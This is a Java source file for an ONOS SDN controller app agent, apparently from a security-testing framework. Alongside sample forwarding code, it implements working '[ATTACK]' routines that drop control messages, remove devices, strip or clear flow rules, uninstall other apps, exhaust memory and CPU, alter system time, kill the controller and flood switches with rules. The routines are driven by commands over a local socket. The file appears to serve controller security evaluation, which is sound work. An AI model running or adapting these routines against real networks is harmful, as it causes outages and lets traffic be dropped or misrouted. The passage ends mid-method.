/*
 * Copyright 2014 Open Networking Laboratory
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.deltaproject.onosagent;

import com.google.common.collect.Lists;
import org.apache.felix.scr.annotations.*;
import org.deltaproject.onosagent.fuzzer.Fuzzing;
import org.onlab.metrics.MetricsService;
import org.onlab.packet.*;
import org.onosproject.app.ApplicationAdminService;
import org.onosproject.cfg.ComponentConfigService;
import org.onosproject.cfg.ConfigProperty;
import org.onosproject.cluster.ClusterAdminService;
import org.onosproject.cluster.ClusterService;
import org.onosproject.core.ApplicationId;
import org.onosproject.core.CoreService;
import org.onosproject.mastership.MastershipAdminService;
import org.onosproject.net.Device;
import org.onosproject.net.Host;
import org.onosproject.net.Path;
import org.onosproject.net.PortNumber;
import org.onosproject.net.device.DeviceAdminService;
import org.onosproject.net.device.DeviceClockProviderService;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.flow.*;
import org.onosproject.net.flow.criteria.Criteria;
import org.onosproject.net.flow.criteria.Criterion;
import org.onosproject.net.host.HostAdminService;
import org.onosproject.net.host.HostService;
import org.onosproject.net.link.LinkAdminService;
import org.onosproject.net.link.LinkService;
import org.onosproject.net.packet.*;
import org.onosproject.net.topology.TopologyService;
import org.osgi.framework.Bundle;
import org.osgi.framework.BundleContext;
import org.osgi.framework.BundleException;
import org.osgi.framework.ServiceReference;
import org.osgi.service.component.ComponentContext;
import org.osgi.service.component.ComponentInstance;
import org.slf4j.Logger;

import java.util.*;

import static com.google.common.base.Strings.isNullOrEmpty;
import static org.slf4j.LoggerFactory.getLogger;

/**
 * Sample reactive forwarding application.
 */
@Component(immediate = true)
public class AppAgent {

	private static final int DEFAULT_TIMEOUT = 10;
	private static final int DEFAULT_PRIORITY = 10;

	private final Logger log = getLogger(getClass());

	// for Service,

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected TopologyService topologyService;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected PacketService packetService;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected HostService hostService;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected FlowRuleService flowRuleService;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected CoreService coreService;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected ComponentConfigService cfgService;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected LinkService linkService;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected DeviceService deviceService;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected MetricsService metricsService;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected ClusterService clusterService;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected DeviceClockProviderService clockService;

	// for Admin Service
	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected HostAdminService hostadmin;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected DeviceAdminService deviceadmin;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected ApplicationAdminService appadmin;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected LinkAdminService linkadmin;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected ClusterAdminService clusteradmin;

	@Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
	protected MastershipAdminService msadmin;

	private ReactivePacketProcessor processor = new ReactivePacketProcessor();

	private ApplicationId appId;

	@Property(name = "packetOutOnly", boolValue = false, label = "Enable packet-out only forwarding; default is false")
	private boolean packetOutOnly = false;

	@Property(name = "packetOutOfppTable", boolValue = false, label = "Enable first packet forwarding using OFPP_TABLE port "
			+ "instead of PacketOut with actual port; default is false")
	private boolean packetOutOfppTable = false;

	@Property(name = "flowTimeout", intValue = DEFAULT_TIMEOUT, label = "Configure Flow Timeout for installed flow rules; "
			+ "default is 10 sec")
	private int flowTimeout = DEFAULT_TIMEOUT;

	@Property(name = "flowPriority", intValue = DEFAULT_PRIORITY, label = "Configure Flow Priority for installed flow rules; "
			+ "default is 10")
	private int flowPriority = DEFAULT_PRIORITY;

	@Property(name = "ipv6Forwarding", boolValue = false, label = "Enable IPv6 forwarding; default is false")
	private boolean ipv6Forwarding = false;

	@Property(name = "matchDstMacOnly", boolValue = false, label = "Enable matching Dst Mac Only; default is false")
	private boolean matchDstMacOnly = false;

	@Property(name = "matchVlanId", boolValue = false, label = "Enable matching Vlan ID; default is false")
	private boolean matchVlanId = false;

	@Property(name = "matchIpv4Address", boolValue = false, label = "Enable matching IPv4 Addresses; default is false")
	private boolean matchIpv4Address = false;

	@Property(name = "matchIpv4Dscp", boolValue = false, label = "Enable matching IPv4 DSCP and ECN; default is false")
	private boolean matchIpv4Dscp = false;

	@Property(name = "matchIpv6Address", boolValue = false, label = "Enable matching IPv6 Addresses; default is false")
	private boolean matchIpv6Address = false;

	@Property(name = "matchIpv6FlowLabel", boolValue = false, label = "Enable matching IPv6 FlowLabel; default is false")
	private boolean matchIpv6FlowLabel = false;

	@Property(name = "matchTcpUdpPorts", boolValue = false, label = "Enable matching TCP/UDP ports; default is false")
	private boolean matchTcpUdpPorts = false;

	@Property(name = "matchIcmpFields", boolValue = false, label = "Enable matching ICMPv4 and ICMPv6 fields; "
			+ "default is false")
	private boolean matchIcmpFields = false;

	// for S3
	private Communication cm;
	private ComponentContext contextbk;
	private SystemTimeSet systime;
	private boolean isDrop = false;
	private boolean isLoop = false;
	private Random ran = new Random();
	private PacketContext dropped = null;

	private Fuzzing fuzzing;

	@Activate
	public void activate(ComponentContext context) {
		contextbk = context;
		cfgService.registerProperties(getClass());

		appId = coreService.registerApplication("org.onosproject.appagent");

		packetService.addProcessor(processor, PacketProcessor.ADVISOR_MAX + 5);
		readComponentConfiguration(context);

		TrafficSelector.Builder selector = DefaultTrafficSelector.builder();
		selector.matchEthType(Ethernet.TYPE_IPV4);
		packetService.requestPackets(selector.build(), PacketPriority.REACTIVE,
				appId);
		selector.matchEthType(Ethernet.TYPE_ARP);
		packetService.requestPackets(selector.build(), PacketPriority.REACTIVE,
				appId);

		if (ipv6Forwarding) {
			selector.matchEthType(Ethernet.TYPE_IPV6);
			packetService.requestPackets(selector.build(),
					PacketPriority.REACTIVE, appId);
		}

		log.info("Started with Application ID {}", appId.id());

		fuzzing = new Fuzzing();
		fuzzing.setCfgService(this.cfgService);

		// test();

		cm = new Communication(this);
		cm.setServerAddr("127.0.0.1", 3366);
		cm.connectServer("AppAgent");
		cm.start();
	}

	@Deactivate
	public void deactivate() {
		cfgService.unregisterProperties(getClass(), false);
		flowRuleService.removeFlowRulesById(appId);
		packetService.removeProcessor(processor);
		processor = null;
		log.info("Stopped");
	}

	@Modified
	public void modified(ComponentContext context) {
		readComponentConfiguration(context);
	}

	/**
	 * Extracts properties from the component configuration context.
	 *
	 * @param context
	 *            the component context
	 */
	private void readComponentConfiguration(ComponentContext context) {
		Dictionary<?, ?> properties = context.getProperties();
		boolean packetOutOnlyEnabled = isPropertyEnabled(properties,
				"packetOutOnly");
		if (packetOutOnly != packetOutOnlyEnabled) {
			packetOutOnly = packetOutOnlyEnabled;
			log.info("Configured. Packet-out only forwarding is {}",
					packetOutOnly ? "enabled" : "disabled");
		}
		boolean packetOutOfppTableEnabled = isPropertyEnabled(properties,
				"packetOutOfppTable");
		if (packetOutOfppTable != packetOutOfppTableEnabled) {
			packetOutOfppTable = packetOutOfppTableEnabled;
			log.info("Configured. Forwarding using OFPP_TABLE port is {}",
					packetOutOfppTable ? "enabled" : "disabled");
		}
		boolean ipv6ForwardingEnabled = isPropertyEnabled(properties,
				"ipv6Forwarding");
		if (ipv6Forwarding != ipv6ForwardingEnabled) {
			ipv6Forwarding = ipv6ForwardingEnabled;
			log.info("Configured. IPv6 forwarding is {}",
					ipv6Forwarding ? "enabled" : "disabled");
		}
		boolean matchDstMacOnlyEnabled = isPropertyEnabled(properties,
				"matchDstMacOnly");
		if (matchDstMacOnly != matchDstMacOnlyEnabled) {
			matchDstMacOnly = matchDstMacOnlyEnabled;
			log.info("Configured. Match Dst MAC Only is {}",
					matchDstMacOnly ? "enabled" : "disabled");
		}
		boolean matchVlanIdEnabled = isPropertyEnabled(properties,
				"matchVlanId");
		if (matchVlanId != matchVlanIdEnabled) {
			matchVlanId = matchVlanIdEnabled;
			log.info("Configured. Matching Vlan ID is {}",
					matchVlanId ? "enabled" : "disabled");
		}
		boolean matchIpv4AddressEnabled = isPropertyEnabled(properties,
				"matchIpv4Address");
		if (matchIpv4Address != matchIpv4AddressEnabled) {
			matchIpv4Address = matchIpv4AddressEnabled;
			log.info("Configured. Matching IPv4 Addresses is {}",
					matchIpv4Address ? "enabled" : "disabled");
		}
		boolean matchIpv4DscpEnabled = isPropertyEnabled(properties,
				"matchIpv4Dscp");
		if (matchIpv4Dscp != matchIpv4DscpEnabled) {
			matchIpv4Dscp = matchIpv4DscpEnabled;
			log.info("Configured. Matching IPv4 DSCP and ECN is {}",
					matchIpv4Dscp ? "enabled" : "disabled");
		}
		boolean matchIpv6AddressEnabled = isPropertyEnabled(properties,
				"matchIpv6Address");
		if (matchIpv6Address != matchIpv6AddressEnabled) {
			matchIpv6Address = matchIpv6AddressEnabled;
			log.info("Configured. Matching IPv6 Addresses is {}",
					matchIpv6Address ? "enabled" : "disabled");
		}
		boolean matchIpv6FlowLabelEnabled = isPropertyEnabled(properties,
				"matchIpv6FlowLabel");
		if (matchIpv6FlowLabel != matchIpv6FlowLabelEnabled) {
			matchIpv6FlowLabel = matchIpv6FlowLabelEnabled;
			log.info("Configured. Matching IPv6 FlowLabel is {}",
					matchIpv6FlowLabel ? "enabled" : "disabled");
		}
		boolean matchTcpUdpPortsEnabled = isPropertyEnabled(properties,
				"matchTcpUdpPorts");
		if (matchTcpUdpPorts != matchTcpUdpPortsEnabled) {
			matchTcpUdpPorts = matchTcpUdpPortsEnabled;
			log.info("Configured. Matching TCP/UDP fields is {}",
					matchTcpUdpPorts ? "enabled" : "disabled");
		}
		boolean matchIcmpFieldsEnabled = isPropertyEnabled(properties,
				"matchIcmpFields");
		if (matchIcmpFields != matchIcmpFieldsEnabled) {
			matchIcmpFields = matchIcmpFieldsEnabled;
			log.info("Configured. Matching ICMP (v4 and v6) fields is {}",
					matchIcmpFields ? "enabled" : "disabled");
		}
		Integer flowTimeoutConfigured = getIntegerProperty(properties,
				"flowTimeout");
		if (flowTimeoutConfigured == null) {
			log.info("Flow Timeout is not configured, default value is {}",
					flowTimeout);
		} else {
			flowTimeout = flowTimeoutConfigured;
			log.info("Configured. Flow Timeout is configured to {}",
					flowTimeout, " seconds");
		}
		Integer flowPriorityConfigured = getIntegerProperty(properties,
				"flowPriority");
		if (flowPriorityConfigured == null) {
			log.info("Flow Priority is not configured, default value is {}",
					flowPriority);
		} else {
			flowPriority = flowPriorityConfigured;
			log.info("Configured. Flow Priority is configured to {}",
					flowPriority);
		}
	}

	/**
	 * Get Integer property from the propertyName Return null if propertyName is
	 * not found.
	 *
	 * @param properties
	 *            properties to be looked up
	 * @param propertyName
	 *            the name of the property to look up
	 * @return value when the propertyName is defined or return null
	 */
	private static Integer getIntegerProperty(Dictionary<?, ?> properties,
			String propertyName) {
		Integer value = null;
		try {
			String s = (String) properties.get(propertyName);
			value = isNullOrEmpty(s) ? value : Integer.parseInt(s.trim());
		} catch (NumberFormatException e) {
			value = null;
		} catch (ClassCastException e) {
			value = null;
		}
		return value;
	}

	/**
	 * Check property name is defined and set to true.
	 *
	 * @param properties
	 *            properties to be looked up
	 * @param propertyName
	 *            the name of the property to look up
	 * @return true when the propertyName is defined and set to true
	 */
	private static boolean isPropertyEnabled(Dictionary<?, ?> properties,
			String propertyName) {
		boolean enabled = false;
		try {
			String flag = (String) properties.get(propertyName);
			if (flag != null) {
				enabled = flag.trim().equals("true");
			}
		} catch (ClassCastException e) {
			// No propertyName defined.
			enabled = false;
		}
		return enabled;
	}

	// for S3 Attack/Misuses

	public void test() {
		System.out.println("Test Start");

		ArrayList<String> cpName = Lists.newArrayList(cfgService
				.getComponentNames());

		for (String s : cpName) {
			System.out.println(s);
			ArrayList<ConfigProperty> plist = Lists.newArrayList(cfgService
					.getProperties(s));

			for (ConfigProperty p : plist) {
				System.out.println(p.name());
			}

		}
		this.cfgService.setProperty(
				"org.onosproject.provider.host.impl.HostLocationProvider",
				"hostRemovalEnabled", "false");

		// this.cfgService.setProperty(
		// "org.onosproject.fwd.ReactiveForwarding",
		// "packetOutOnly", "false");
	}

	/*
	 * A-2-M
	 */
	public boolean Set_Control_Message_Drop() {
		System.out.println("[ATTACK] Control_Message_Drop");
		isDrop = true;
		return true;
	}

	public String Control_Message_Drop() {
		// System.out.println("[ATTACK] Control_Message_Drop");
		String drop = "";

		while (processor.getDropped() == null) {
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

		InboundPacket in = processor.getDropped().inPacket();

		Ethernet eth = in.parsed();

		drop = processor.getDropped().toString();
		if (eth != null)
			drop = eth.toString();
		else
			drop = in.toString();

		// System.out.println("[ATTACK] "+drop);
		return drop;
	}

	public boolean Set_Infinite_Loop() {
		System.out.println("[ATTACK] Set_Infinite_Loop");
		this.isLoop = true;

		return true;
	}

	public static boolean Infinite_Loop() {
		System.out.println("[ATTACK] Infinite_Loop");
		int i = 0;

		while (i < 32767) {
			System.out.println("[ATTACK] Loop Count: " + i);
			i++;

			if (i == 32766)
				i = 0;
		}

		return true;
	}

	/*
	 * A-3-M
	 */
	public String Internal_Storage_Abuse() {
		System.out.println("[ATTACK] Internal_Storage_Abuse");

		String removed = "";

		Iterable<Device> dv = deviceService.getDevices();
		Iterator it = dv.iterator();
		while (it.hasNext()) {
			Device piece = (Device) it.next();
			deviceadmin.removeDevice(piece.id());
			removed = removed + piece.id() + "-" + piece.serialNumber() + "|";
		}

		System.out.println("[ATTACK] Device Remove: \n"+removed);
		// Set<ControllerNode> nodeset = clusterService.getNodes();
		// ControllerNode[] nodelist = (ControllerNode[]) nodeset.toArray();
		//
		// for (ControllerNode node : nodelist) {
		// clusteradmin.removeNode(node.id());
		// }

		return removed;
	}

	/*
	 * A-5-M
	 */
	public String Flow_Rule_Modification() {
		System.out.println("[ATTACK] Flow_Rule_Modification");
		Iterable<Device> dv = deviceService.getDevices();
		Iterator it = dv.iterator();

		String result = "";

		while (it.hasNext()) {
			Device piece = (Device) it.next();
			Iterable<FlowEntry> fe = flowRuleService.getFlowEntries(piece.id());
			Iterator f = fe.iterator();

			while (f.hasNext()) {
				FlowEntry old = (FlowEntry) f.next();
				TrafficTreatment.Builder treat = DefaultTrafficTreatment
						.builder();

				FlowRule newf = new DefaultFlowRule(old.deviceId(),
						old.selector(), treat.build(), old.priority(),
						old.appId(), old.timeout(), false);

				flowRuleService.removeFlowRules(old);
				flowRuleService.applyFlowRules(newf);

				result = "success|" + old.toString() + "\n ---> "
						+ newf.toString();
				System.out.println("\n[ATTACK] " + result + "\n\n");
			}
		}

		return result;
	}

	public void Flow_Table_Clearance(boolean isLoop) {
		System.out.println("[ATTACK] Flow_Table_Clearance");

		int cnt = 1;
		int loop = 0;

		/* forever */
		for (int i = 0; i < cnt; i++) {
			Iterable<Device> dv = deviceService.getDevices();
			Iterator it = dv.iterator();

			while (it.hasNext()) {
				Device piece = (Device) it.next();
				Iterable<FlowEntry> fe = flowRuleService.getFlowEntries(piece
						.id());
				Iterator f = fe.iterator();

				while (f.hasNext()) {
					FlowEntry e = (FlowEntry) f.next();
					TrafficSelector select = e.selector();
					Criterion c = select.getCriterion(Criterion.Type.ETH_TYPE);
					// System.out.println("Ether TYPE " +c.toString());
					if (c.toString().contains("800")) {
						flowRuleService.removeFlowRules(e);
						System.out.println("[ATTACK] Remove Rule: "
								+ e.toString() + "\n");
					}

				}
			}

			if (isLoop) {
				i = -1;
				
				if(loop++ == 1000) {
					System.out.println("Looop "+loop);
					break;
				}
			}
		}
	}

	/*
	 * A-6-M
	 */
	public boolean Event_Listener_Unsubscription() {
		BundleContext bc = contextbk.getBundleContext();
		ComponentInstance ci = contextbk.getComponentInstance();

		Bundle[] blist = bc.getBundles();

		for (int i = 0; i < blist.length; i++) {
			Bundle bd = blist[i];
			bd.getRegisteredServices();

			ServiceReference[] servicelist = bd.getRegisteredServices();

			for (ServiceReference sr : servicelist) {

			}
		}

		return true;
	}

	public String Application_Eviction(String appname) {
		System.out.println("[ATTACK] Application_Eviction");
		boolean isRemoved = false;
		String result = "";

		BundleContext bc = contextbk.getBundleContext();

		Bundle[] blist = bc.getBundles();

		for (int i = 0; i < blist.length; i++) {
			Bundle bd = blist[i];
			bd.getRegisteredServices();

			if (bd.getSymbolicName().contains(appname)) {
				isRemoved = true;
				result = bd.getSymbolicName();

				System.out.println("[ATTACK] " + result + " is uninstalled!");

				try {
					bd.uninstall();
				} catch (BundleException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}

		if (!isRemoved) {
			result = "fail";
		}

		return result;
	}

	/*
	 * A-7-M
	 */
	public void Resource_Exhaustion_Mem() {
		System.out.println("[ATTACK] Resource Exhausion : Mem");
		ArrayList<long[][]> arry;
		// ary = new long[Integer.MAX_VALUE][Integer.MAX_VALUE];
		arry = new ArrayList<long[][]>();
		while (true) {
			arry.add(new long[Integer.MAX_VALUE][Integer.MAX_VALUE]);
		}
	}

	public boolean Resource_Exhaustion_CPU() {
		System.out.println("[ATTACK] Resource Exhausion : CPU");
		int thread_count = 0;

		for (int count = 0; count < 100; count++) {
			CPU cpu_thread = new CPU();
			cpu_thread.start();
			thread_count++;
		}

		return true;
	}

	/*
	 * A-8-M
	 */
	public boolean System_Variable_Manipulation() {
		System.out.println("[ATTACK] System_Variable_Manipulation");
		this.systime = new SystemTimeSet();
		systime.start();
		return true;
	}

	/*
	 * A-9-M
	 */
	public boolean System_Command_Execution() {
		System.out.println("[ATTACK] System_Command_Execution");
		System.exit(0);

		return true;
	}

	/*
	 * C-1-A
	 */
	public boolean Flow_Rule_Flooding() {
		System.out.println("[ATTACK] Flow_Rule_Flooding");
		TrafficTreatment.Builder treat = DefaultTrafficTreatment.builder();
		TrafficSelector.Builder selector = DefaultTrafficSelector.builder();

		Iterable<Device> dv = deviceService.getDevices();
		Iterator it = dv.iterator();

		while (it.hasNext()) {
			Device piece = (Device) it.next();

			for (int i = 0; i < 32767; i++) {
				selector.matchEthDst(MacAddress.valueOf(ran.nextLong()));
				FlowRule newf = new DefaultFlowRule(piece.id(),
						selector.build(), treat.build(), ran.nextInt(32767),
						appId, flowTimeout, false);

				flowRuleService.applyFlowRules(newf);
			}
		}

		return true;
	}

	/*
	 * C-2-M
	 */
	public String Switch_Firmware_Misuse() {
		String result = "";

		System.out.println("\n\n[ATTACK] Switch_Firmware_Misuse");
		TrafficSelector.Builder selector = DefaultTrafficSelector.builder();

		Iterable<Device> dv = deviceService.getDevices();
		Iterator it = dv.iterator();

		while (it.hasNext()) {
			Device piece = (Device) it.next();
			Iterable<FlowEntry> fe = flowRuleService.getFlowEntries(piece.id());
			Iterator f = fe.iterator();

			while (f.hasNext()) {
				FlowEntry old = (FlowEntry) f.next();
				Criteria.EthTypeCriterion c = (Criteria.EthTypeCriterion) old
						.selector().getCriterion(Criterion.Type.ETH_TYPE);

				if (c != null) {
					String type = c.toString();

					/* MAC -> IP addr for IP packet */
					if (type.contains("800")) {
						Criteria.EthCriterion dst = (Criteria.EthCriterion) old
								.selector()
								.getCriterion(Criterion.Type.ETH_DST);
						Criteria.EthCriterion src = (Criteria.EthCriterion) old
								.selector()
								.getCriterion(Criterion.Type.ETH_SRC);

						if (dst != null && src != null) {
							Set<Host> shost = hostService.getHostsByMac(src
									.mac());
							Set<Host> dhost = hostService.getHostsByMac(dst
									.mac());
							Host srcH = new ArrayList<Host>(shost).get(0);
							Host dstH = new ArrayList<Host>(dhost).get(0);

							Set<IpAddress> srcIpSet = srcH.ipAddresses();
							Set<IpAddress> dstIpSet = dstH.ipAddresses();
							IpAddress srcIP = new ArrayList<IpAddress>(srcIpSet)
									.get(0);
							IpAddress dstIP = new ArrayList<IpAddress>(dstIpSet)
									.get(0);

							Ip4Prefix matchIp4SrcPrefix = Ip4Prefix
									.valueOf(dstIP.toOctets(),
											Ip4Prefix.MAX_MASK_LENGTH);
							Ip4Prefix matchIp4DstPrefix = Ip4Prefix
									.valueOf(srcIP.toOctets(),
											Ip4Prefix.MAX_MASK_LENGTH);

							Criteria.PortCriterion port = (Criteria.PortCriterion) old
									.selector().getCriterion(
											Criterion.Type.IN_PORT);

							selector.matchInPort(port.port())
									.matchIPSrc(matchIp4SrcPrefix)
									.matchIPDst(matchIp4DstPrefix);

							FlowRule newf = new DefaultFlowRule(old.deviceId(),
									selector.build(), old.treatment(),
									old.priority(), old.appId(), old.timeout(),
									false);

							if (!result.equals("")) {
								result = "Mac Address " + src.toString()
										+ "\n--> IP Address " + srcIP.toString();
								
								System.out.println("\n[ATTACK] "+result+"\n");
							}
							
							flowRuleService.removeFlowRules(old);
							flowRuleService.applyFlowRules(newf);
						}
					}
				}
			}
		}
		return result;
	}

	/**
	 * Packet processor responsible for forwarding packets along their paths.
	 */
	private class ReactivePacketProcessor implements PacketProcessor {
		public PacketContext droppedPacket = null;

		public PacketContext getDropped() {
			return droppedPacket;
		}

		public void process(PacketContext context) {
			if (isDrop) {
				if (droppedPacket == null)
					droppedPacket = context;
				
				InboundPacket ip = context.inPacket();
				Ethernet eth = ip.parsed();
				System.out.println("Drop Packet Info: ");
				System.out.println(eth.toString() + "\n");

				context.block();
			} else if (isLoop)
				AppAgent.Infinite_Loop();

			// Set<Application> appset = appadmin.getApplications();
			// Infinite_Loop();
			// context.block();
			// context.send();
			// Stop processing if the packet has been handled, since we
			// can't do any more to it.

			// if (context.isHandled()) {
			// return;
			// }
			//
			// InboundPacket pkt = context.inPacket();
			// Ethernet ethPkt = pkt.parsed();
			//
			// if (ethPkt == null) {
			// return;
			// }
			//
			// // Bail if this is deemed to be a control packet.
			// if (isControlPacket(ethPkt)) {
			// return;
			// }
			//
			// // Skip IPv6 multicast packet when IPv6 forward is disabled.
			// if (!ipv6Forwarding && isIpv6Multicast(ethPkt)) {
			// return;
			// }
			//
			// HostId id = HostId.hostId(ethPkt.getDestinationMAC());
			//
			// // Do not process link-local addresses in any way.
			// if (id.mac().isLinkLocal()) {
			// return;
			// }
			//
			// // Do we know who this is for? If not, flood and bail.
			// Host dst = hostService.getHost(id);
			// if (dst == null) {
			// flood(context);
			// return;
			// }
			//
			// // Are we on an edge switch that our destination is on? If so,
			// // simply forward out to the destination and bail.
			// if
			// (pkt.receivedFrom().deviceId().equals(dst.location().deviceId()))
			// {
			// if
			// (!context.inPacket().receivedFrom().port().equals(dst.location().port()))
			// {
			// installRule(context, dst.location().port());
			// }
			// return;
			// }
			//
			// // Otherwise, get a set of paths that lead from here to the
			// // destination edge switch.
			// Set<Path> paths =
			// topologyService.getPaths(topologyService.currentTopology(),
			// pkt.receivedFrom().deviceId(),
			// dst.location().deviceId());
			// if (paths.isEmpty()) {
			// // If there are no paths, flood and bail.
			// flood(context);
			// return;
			// }
			//
			// // Otherwise, pick a path that does not lead back to where we
			// // came from; if no such path, flood and bail.
			// Path path = pickForwardPath(paths, pkt.receivedFrom().port());
			// if (path == null) {
			// log.warn("Doh... don't know where to go... {} -> {} received on {}",
			// ethPkt.getSourceMAC(), ethPkt.getDestinationMAC(),
			// pkt.receivedFrom());
			// flood(context);
			// return;
			// }
			//
			// // Otherwise forward and be done with it.
			// installRule(context, path.src().port());
		}

	}

	// Indicates whether this is a control packet, e.g. LLDP, BDDP
	private boolean isControlPacket(Ethernet eth) {
		short type = eth.getEtherType();
		return type == Ethernet.TYPE_LLDP || type == Ethernet.TYPE_BSN;
	}

	// Indicated whether this is an IPv6 multicast packet.
	private boolean isIpv6Multicast(Ethernet eth) {
		return eth.getEtherType() == Ethernet.TYPE_IPV6 && eth.isMulticast();
	}

	// Selects a path from the given set that does not lead back to the
	// specified port.
	private Path pickForwardPath(Set<Path> paths, PortNumber notToPort) {
		for (Path path : paths) {
			if (!path.src().port().equals(notToPort)) {
				return path;
			}
		}
		return null;
	}

	// Floods the specified packet if permissible.
	private void flood(PacketContext context) {
		if (topologyService.isBroadcastPoint(topologyService.currentTopology(),
				context.inPacket().receivedFrom())) {
			packetOut(context, PortNumber.FLOOD);
		} else {
			context.block();
		}
	}

	// Sends a packet out the specified port.
	private void packetOut(PacketContext context, PortNumber portNumber) {
		context.treatmentBuilder().setOutput(portNumber);
		context.send();
	}

	// Install a rule forwarding the packet to the specified port.
	private void installRule(PacketContext context, PortNumber portNumber) {
		//
		// We don't support (yet) buffer IDs in the Flow Service so
		// packet out first.
		//
		Ethernet inPkt = context.inPacket().parsed();
		TrafficSelector.Builder builder = DefaultTrafficSelector.builder();

		// If PacketOutOnly or ARP packet than forward directly to output port
		if (packetOutOnly || inPkt.getEtherType() == Ethernet.TYPE_ARP) {
			packetOut(context, portNumber);
			return;
		}

		//
		// If matchDstMacOnly
		// Create flows matching dstMac only
		// Else
		// Create flows with default matching and include configured fields
		//
		if (matchDstMacOnly) {
			builder.matchEthDst(inPkt.getDestinationMAC());
		} else {
			builder.matchInPort(context.inPacket().receivedFrom().port())
					.matchEthSrc(inPkt.getSourceMAC())
					.matchEthDst(inPkt.getDestinationMAC())
					.matchEthType(inPkt.getEtherType());

			// If configured Match Vlan ID
			if (matchVlanId && inPkt.getVlanID() != Ethernet.VLAN_UNTAGGED) {
				builder.matchVlanId(VlanId.vlanId(inPkt.getVlanID()));
			}

			//
			// If configured and EtherType is IPv4 - Match IPv4 and
			// TCP/UDP/ICMP fields
			//
			if (matchIpv4Address && inPkt.getEtherType() == Ethernet.TYPE_IPV4) {
				IPv4 ipv4Packet = (IPv4) inPkt.getPayload();
				byte ipv4Protocol = ipv4Packet.getProtocol();
				Ip4Prefix matchIp4SrcPrefix = Ip4Prefix.valueOf(
						ipv4Packet.getSourceAddress(),
						Ip4Prefix.MAX_MASK_LENGTH);
				Ip4Prefix matchIp4DstPrefix = Ip4Prefix.valueOf(
						ipv4Packet.getDestinationAddress(),
						Ip4Prefix.MAX_MASK_LENGTH);
				builder.matchIPSrc(matchIp4SrcPrefix)
						.matchIPDst(matchIp4DstPrefix)
						.matchIPProtocol(ipv4Protocol);

				if (matchIpv4Dscp) {
					byte dscp = ipv4Packet.getDscp();
					byte ecn = ipv4Packet.getEcn();
					builder.matchIPDscp(dscp).matchIPEcn(ecn);
				}

				if (matchTcpUdpPorts && ipv4Protocol == IPv4.PROTOCOL_TCP) {
					TCP tcpPacket = (TCP) ipv4Packet.getPayload();
					builder.matchTcpSrc(tcpPacket.getSourcePort()).matchTcpDst(
							tcpPacket.getDestinationPort());
				}
				if (matchTcpUdpPorts && ipv4Protocol == IPv4.PROTOCOL_UDP) {
					UDP udpPacket = (UDP) ipv4Packet.getPayload();
					builder.matchUdpSrc(udpPacket.getSourcePort()).matchUdpDst(
							udpPacket.getDestinationPort());
				}
				if (matchIcmpFields && ipv4Protocol == IPv4.PROTOCOL_ICMP) {
					ICMP icmpPacket = (ICMP) ipv4Packet.getPayload();
					builder.matchIcmpType(icmpPacket.getIcmpType())
							.matchIcmpCode(icmpPacket.getIcmpCode());
				}
			}

			//
			// If configured and EtherType is IPv6 - Match IPv6 and
			// TCP/UDP/ICMP fields
			//
			if (matchIpv6Address && inPkt.getEtherType() == Ethernet.TYPE_IPV6) {
				IPv6 ipv6Packet = (IPv6) inPkt.getPayload();
				byte ipv6NextHeader = ipv6Packet.getNextHeader();
				Ip6Prefix matchIp6SrcPrefix = Ip6Prefix.valueOf(
						ipv6Packet.getSourceAddress(),
						Ip6Prefix.MAX_MASK_LENGTH);
				Ip6Prefix matchIp6DstPrefix = Ip6Prefix.valueOf(
						ipv6Packet.getDestinationAddress(),
						Ip6Prefix.MAX_MASK_LENGTH);
				builder.matchIPv6Src(matchIp6SrcPrefix)
						.matchIPv6Dst(matchIp6DstPrefix)
						.matchIPProtocol(ipv6NextHeader);

				if (matchIpv6FlowLabel) {
					builder.matchIPv6FlowLabel(ipv6Packet.getFlowLabel());
				}

				if (matchTcpUdpPorts && ipv6NextHeader == IPv6.PROTOCOL_TCP) {
					TCP tcpPacket = (TCP) ipv6Packet.getPayload();
					builder.matchTcpSrc(tcpPacket.getSourcePort()).matchTcpDst(
							tcpPacket.getDestinationPort());
				}
				if (matchTcpUdpPorts && ipv6NextHeader == IPv6.PROTOCOL_UDP) {
					UDP udpPacket = (UDP) ipv6Packet.getPayload();
					builder.matchUdpSrc(udpPacket.getSourcePort()).matchUdpDst(
							udpPacket.getDestinationPort());
				}
				if (matchIcmpFields && ipv6NextHeader == IPv6.PROTOCOL_ICMP6) {
					ICMP6 icmp6Packet = (ICMP6) ipv6Packet.getPayload();
					builder.matchIcmpv6Type(icmp6Packet.getIcmpType())
							.matchIcmpv6Code(icmp6Packet.getIcmpCode());
				}
			}
		}
		TrafficTreatment.Builder treat = DefaultTrafficTreatment.builder();
		treat.setOutput(portNumber);

		FlowRule f = new DefaultFlowRule(context.inPacket().receivedFrom()
				.deviceId(), builder.build(), treat.build(), flowPriority,
				appId, flowTimeout, false);

